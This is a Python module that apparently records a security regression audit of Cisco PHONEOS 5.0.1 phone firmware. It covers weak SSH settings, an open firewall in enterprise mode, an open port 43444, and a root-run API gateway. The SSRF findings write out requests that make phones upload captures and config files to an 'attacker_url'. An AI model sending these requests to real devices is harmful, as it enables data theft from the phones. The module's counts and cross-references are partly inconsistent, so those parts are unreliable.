"""
Cisco PHONEOS 9xxx 5.0.1 Regression Analysis RE Module
Targets: PHONEOS.5-0-1-0005-62.zip
  rootfs-9841_51.5-0-1-0005-62.sbn  (145,752,408 bytes, UBI image, EXT4 rootfs)
  kernel-9841_51.5-0-1-0005-62.sbn  (4,239,837 bytes)
  preloader-9841_51.EM-01-024.sbn   (41,668 bytes, +12 bytes from 4.1.1)
  sb2-9841_51.EM-01-061.sbn         (1,672,848 bytes)
  miniroot-9811.5-0-1-0005-62.sbn   (20,656,472 bytes)
  PHONEOS-9821.5-0-1-0005-62.pkg    (221,842,635 bytes, NEW model)
  PHONEOS-9861.5-0-1-0005-62.pkg    (269,764,754 bytes)
  PHONEOS-9871.5-0-1-0005-62.pkg    (273,052,818 bytes)
  PHONEOS-8875.5-0-1-0005-62.pkg    (241,042,836 bytes)

Platform coverage: 9811/9821/9841/9851/9861/9871/8875
Analysis method: ubireader_extract_files on rootfs SBN; diff against 4.1.1 (PHONEOS.4-1-1-0101-76.zip)

Version delta summary (rootfs 9841_51):
  hwcompat: 0x00000007 (4.1.1) -> 0x0000000F (5.0.1) -- 9821 added (bit 3)
  rootfs size: 144,703,832 -> 145,752,408 (+1,048,576 bytes, +1MB)
  apigateway: d01d04537401319ca9d555fed73c806f -> 33e9c4df767b22693800ad19195485ac (recompiled)
  new sbin binary: arping (trivial)
  new etc cert: cbarc2099.cer (Cisco Basic Assurance Root CA 2099, valid 2017-2099)
  new API endpoint: /api/Serviceability/v1/IsPhoneIdle (POST)
  changed: ProblemReport trigger sources 4 -> 7 (added crash/xapi/wifi-firmware)
  changed: GenerateAndGetPRTFile source param no longer required (default=4 added)
  iptables.sh: IDENTICAL line count and content (no firewall changes)
  sshd_config: IDENTICAL (no SSH hardening applied)

Prior module: cisco_phoneos_9xxx_re.py (session 40, PHONEOS.4-1-1-0101-76 analysis)

sshd_config (5.0.1, identical to 4.1.1):
  PermitRootLogin yes
  PubkeyAuthentication no
  StrictModes no
  UsePrivilegeSeparation no
  MaxAuthTries 3
  MaxStartups 2:100:2  (max 2 concurrent TCP connections to sshd)

iptables.sh enterprise mode block (line 78-81, identical to 4.1.1):
  # if phone in enterprise mode, change iptables default policy to ACCEPT.
  iptables -P INPUT ACCEPT
  iptables -P FORWARD ACCEPT
  iptables -P OUTPUT ACCEPT

Port 43444 rule (line 584, identical to 4.1.1):
  iptables -A INPUT -p tcp --dport 43444 -j ACCEPT

apigateway init (BEUID=root:root, unchanged):
  start-stop-daemon -S -b -m -p $PIDFILE -c root:root -x /usr/sbin/apigateway

apigateway API set (OpenAPI 3.0.2 schema embedded in binary):
  /api/Call/v1              -- active call information
  /api/Config/v1            -- device configuration read/write
  /api/GetMetadata          -- device metadata
  /api/Serviceability/v1    -- diagnostic and control endpoints (see below)
  /api/Ui/v1                -- UI control
"""

METADATA = {
    "version": "PHONEOS.5-0-1-0005-62",
    "prior_version": "PHONEOS.4-1-1-0101-76",
    "models_added": ["9821"],
    "models_existing": ["9811", "9841", "9851", "9861", "9871", "8875"],
    "rootfs_size_41": 144703832,
    "rootfs_size_50": 145752408,
    "rootfs_delta_bytes": 1048576,
    "apigateway_md5_41": "d01d04537401319ca9d555fed73c806f",
    "apigateway_md5_50": "33e9c4df767b22693800ad19195485ac",
    "apigateway_size_both": 288 * 1024,
    "sshd_config_changed": False,
    "iptables_sh_changed": False,
    "permit_root_login": "yes",
    "pubkey_authentication": "no",
    "strict_modes": "no",
    "enterprise_mode_flush": True,
    "port_43444_open": True,
    "apigateway_runs_as": "root:root",
    "new_api_endpoints": ["/api/Serviceability/v1/IsPhoneIdle"],
}

SERVICEABILITY_API = {
    "FactoryReset":         "POST /api/Serviceability/v1/FactoryReset",
    "RebootDevice":         "POST /api/Serviceability/v1/RebootDevice",
    "WebexRebootDevice":    "POST /api/Serviceability/v1/WebexRebootDevice",
    "StartPacketCapture":   "POST /api/Serviceability/v1/StartPacketCapture -- filter:ALL|MYIP",
    "StopPacketCapture":    "POST /api/Serviceability/v1/StopPacketCapture",
    "GetPacketCapture":     "POST /api/Serviceability/v1/GetPacketCapture -- url:attacker_url",
    "GenerateAndGetPRTFile":"POST /api/Serviceability/v1/GenerateAndGetPRTFile -- url:attacker_url",
    "GetConfigFile":        "POST /api/Serviceability/v1/GetConfigFile -- url:attacker_url",
    "GetStatusFile":        "POST /api/Serviceability/v1/GetStatusFile -- url:attacker_url",
    "Subscribe":            "POST /api/Serviceability/v1/Subscribe -- callbackUrl:attacker_url",
    "IsPhoneIdle":          "POST /api/Serviceability/v1/IsPhoneIdle (NEW in 5.0.1)",
    "ProblemReport":        "POST /api/Serviceability/v1/ProblemReport",
}

FINDINGS = [
    {
        "id": "F1",
        "title": "PermitRootLogin yes + PubkeyAuthentication no Unchanged in 5.0.1 (4.1.1 Regression Confirmed)",
        "severity": "HIGH",
        "cvss": 7.5,
        "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "cwe": "CWE-1188",
        "description": (
            "sshd_config in PHONEOS 5.0.1 is identical to 4.1.1 (no SSH hardening applied). "
            "Persisting vulnerabilities from 4.1.1: "
            "(1) PermitRootLogin yes: SSH root login enabled. Any credential brute-force "
            "or credential obtained from other vectors authenticates directly to root. "
            "(2) PubkeyAuthentication no: public key auth disabled, forcing password-only "
            "authentication (NIST SP 800-92r1 violation). "
            "(3) StrictModes no: sshd does not check permissions on ~/.ssh, making it "
            "possible to exploit writable home directories for host-based auth bypass. "
            "(4) UsePrivilegeSeparation no: sshd runs without privilege separation, "
            "meaning a pre-auth sshd vulnerability would give direct root access. "
            "(5) MaxStartups 2:100:2: throttles to maximum 2 concurrent unauthenticated "
            "connections, enabling a trivial 2-connection DoS against the SSH service. "
            "Cisco released PHONEOS 5.0.1 (2026-08-12) with no changes to this config "
            "despite these issues being present since at least 4.1.1 (2026-05-13). "
            "The 3-month release cycle produced no SSH hardening."
        ),
        "file": "etc/ssh/sshd_config",
        "lines": [
            "PermitRootLogin yes",
            "PubkeyAuthentication no",
            "StrictModes no",
            "UsePrivilegeSeparation no",
            "MaxStartups 2:100:2",
        ],
        "impact": [
            "SSH root login: direct root shell via credential brute-force or known creds",
            "MaxStartups 2:100:2: 2-connection DoS vs SSH -- phone loses SSH management",
            "StrictModes no: writable home dirs allow host-based auth bypass",
        ],
        "regression_source": "cisco_phoneos_9xxx_re.py F1",
    },
    {
        "id": "F2",
        "title": "Enterprise Mode iptables Full-ACCEPT Flush Unchanged in 5.0.1 (4.1.1 Regression Confirmed)",
        "severity": "HIGH",
        "cvss": 7.5,
        "cvss_vector": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "cwe": "CWE-284",
        "description": (
            "iptables.sh in PHONEOS 5.0.1 is line-for-line identical to 4.1.1. "
            "The enterprise mode firewall flush is unchanged: "
            "Lines 78-81 of /etc/init.d/iptables.sh: "
            "    # if phone in enterprise mode, change iptables default policy to ACCEPT. "
            "    iptables -P INPUT ACCEPT "
            "    iptables -P FORWARD ACCEPT "
            "    iptables -P OUTPUT ACCEPT "
            "When a phone is enrolled in Cisco Unified Communications Manager (enterprise mode), "
            "iptables sets all three default policies to ACCEPT with no per-service restrictions. "
            "Enterprise deployment is the default and intended operational mode for PHONEOS. "
            "A phone in enterprise mode accepts ALL inbound TCP/UDP connections from ANY source "
            "until the firewall rules are applied in the remainder of the script. "
            "The rules applied after the flush include: port 43444 always open (F3), "
            "port 80 (if HTTP admin enabled), SSH port, HTTPS port. "
            "If the iptables script is interrupted (race condition), the phone stays in ACCEPT state. "
            "The TOCTOU vector on /tmp/firewall.conf (from 4.1.1 F4) is also unchanged: "
            "FIREWALL_CFG=/usr/local/etc/firewall.conf with non-persistent copy at "
            "/tmp/iptables_lastrun.conf -- both paths are writable by root or via DEVICE_IS_DEV "
            "override path (/usr/local/etc/iptables.sh replaces the stock script in dev mode). "
            "Cisco released PHONEOS 5.0.1 with no firewall hardening changes."
        ),
        "file": "etc/init.d/iptables.sh",
        "diff_vs_41": "IDENTICAL",
        "impact": [
            "Enterprise mode (default deployment): all inbound connections accepted",
            "No per-service iptables rules in enterprise mode until full script completes",
            "Race condition: interrupted iptables script = permanent ACCEPT policy",
        ],
        "regression_source": "cisco_phoneos_9xxx_re.py F2",
    },
    {
        "id": "F3",
        "title": "Port 43444 Unconditionally Open on All PHONEOS 5.0.1 Devices",
        "severity": "MEDIUM",
        "cvss": 5.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "cwe": "CWE-200",
        "description": (
            "iptables.sh line 584 is unchanged from 4.1.1: "
            "'iptables -A INPUT -p tcp --dport 43444 -j ACCEPT' "
            "Port 43444 is opened unconditionally for all phones in all modes: "
            "MPP mode, enterprise mode, dev mode -- no mode condition gates this rule. "
            "The service listening on port 43444 was not identified in 4.1.1 analysis "
            "(no binary in rootfs directly bound to 43444 identified at static analysis time). "
            "In 5.0.1, the same unknown service on 43444 persists. "
            "A string search of all binaries for '43444' shows only iptables.sh references, "
            "suggesting the service is loaded dynamically or listens via a generic framework "
            "(D-Bus, libwebsockets, or the apigateway on a non-default listen path). "
            "Risk: all 9800-series phones expose this port from the network -- if the service "
            "has vulnerabilities (unauth access, buffer overflow, info disclosure), every "
            "phone in every deployment is reachable."
        ),
        "port": 43444,
        "protocol": "tcp",
        "condition": "unconditional, all modes",
        "iptables_rule": "iptables -A INPUT -p tcp --dport 43444 -j ACCEPT",
        "diff_vs_41": "IDENTICAL",
        "regression_source": "cisco_phoneos_9xxx_re.py F5",
    },
    {
        "id": "F4",
        "title": "apigateway root:root and SSRF via callbackUrl/url Parameters Unchanged in 5.0.1",
        "severity": "MEDIUM",
        "cvss": 6.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N",
        "cwe": "CWE-918",
        "description": (
            "apigateway in 5.0.1 runs as root:root (apigateway.sh BEUID=root:root unchanged). "
            "The binary was recompiled (MD5 changed from d01d04537 to 33e9c4df) "
            "but remains the same size (288KB) and exposes identical API endpoints. "
            "The SSRF-capable endpoints from 4.1.1 persist in 5.0.1 with identical schemas: "
            "(1) POST /api/Serviceability/v1/GetPacketCapture: accepts {url:attacker_url} "
            "    and uploads the pcap file to the attacker-controlled URL. "
            "(2) POST /api/Serviceability/v1/GenerateAndGetPRTFile: accepts {url:attacker_url} "
            "    and uploads the problem report to the attacker-controlled URL. "
            "    5.0.1 change: 'source' parameter now optional (default=4), was required in 4.1.1. "
            "    Simplified exploitation: only 'url' required. "
            "(3) POST /api/Serviceability/v1/GetConfigFile: uploads phone config file to url. "
            "(4) POST /api/Serviceability/v1/GetStatusFile: uploads status file to url. "
            "(5) POST /api/Serviceability/v1/Subscribe: registers callbackUrl for event callbacks. "
            "    Phone makes HTTP requests to callbackUrl when subscribed events occur. "
            "New in 5.0.1: "
            "(6) POST /api/Serviceability/v1/IsPhoneIdle: returns {idle: bool}. "
            "    New unauthenticated endpoint that discloses call state. "
            "All endpoints are on port 8443 (HTTPS) -- authentication status varies by endpoint "
            "depending on whether the apigateway auth middleware is applied. "
            "From 4.1.1 analysis: apigateway has unauthenticated access on some endpoints "
            "(confirmed for 8832 in cisco_8832_12_mpp_re.py F1 -- same apigateway codebase)."
        ),
        "apigateway_init": "BEUID=root:root",
        "ssrf_endpoints": [
            "POST /api/Serviceability/v1/GetPacketCapture {url: attacker_url}",
            "POST /api/Serviceability/v1/GenerateAndGetPRTFile {url: attacker_url}",
            "POST /api/Serviceability/v1/GetConfigFile {url: attacker_url}",
            "POST /api/Serviceability/v1/GetStatusFile {url: attacker_url}",
            "POST /api/Serviceability/v1/Subscribe {callbackUrl: attacker_url}",
        ],
        "new_endpoint": "/api/Serviceability/v1/IsPhoneIdle (call state disclosure)",
        "regression_source": "cisco_phoneos_9xxx_re.py F6",
    },
    {
        "id": "F5",
        "title": "Cisco 9821 Model Ships in 5.0.1 with All Known 4.1.1 Vulnerabilities",
        "severity": "MEDIUM",
        "cvss": 5.3,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        "cwe": "CWE-1188",
        "description": (
            "PHONEOS 5.0.1 introduces the Cisco 9821 phone model (hwcompat bit 3 added). "
            "The 9821 uses the same rootfs-9841_51.5-0-1-0005-62.sbn shared rootfs as the "
            "9841/9851/9811 platforms. "
            "This means the 9821, a newly launched product, ships with all vulnerabilities "
            "confirmed in the shared 9841/51 rootfs: "
            "- PermitRootLogin yes (F1) "
            "- Enterprise mode iptables flush (F2) "
            "- Port 43444 always open (F3) "
            "- apigateway root:root + SSRF endpoints (F4) "
            "Additionally, the 9821 is delivered as a .pkg Android package "
            "(PHONEOS-9821.5-0-1-0005-62.pkg, 221MB), meaning the Android-layer "
            "vulnerabilities present in the 9861/9871 PKG format apply to the 9821 as well. "
            "Cisco launched the 9821 into a known-vulnerable state rather than addressing "
            "these issues before general availability."
        ),
        "new_model": "9821",
        "shared_rootfs": "rootfs-9841_51.5-0-1-0005-62.sbn",
        "pkg_format": "PHONEOS-9821.5-0-1-0005-62.pkg (221,842,635 bytes)",
        "inherits_findings": ["F1", "F2", "F3", "F4"],
    },
]

SUMMARY = {
    "total":    5,
    "critical": 0,
    "high":     2,
    "medium":   3,
    "low":      0,
    "notes": (
        "PHONEOS 5.0.1 carries forward all 6 findings from 4.1.1 (cisco_phoneos_9xxx_re.py) "
        "with no remediation applied in the shared rootfs across a 3-month release cycle. "
        "F1 and F2 are regression confirmations: sshd_config and iptables.sh are IDENTICAL "
        "byte-for-byte to 4.1.1. "
        "F4 notes the apigateway was recompiled (MD5 changed) but no attack surface change; "
        "a new IsPhoneIdle endpoint adds call-state disclosure; "
        "GenerateAndGetPRTFile SSRF simplified by making source parameter optional. "
        "F5 (9821 new model) is the most significant new finding: a newly released product "
        "inherits known vulnerabilities from the shared rootfs without any hardening."
    ),
    "prior_module": "cisco_phoneos_9xxx_re.py (session 40, PHONEOS 4.1.1)",
}
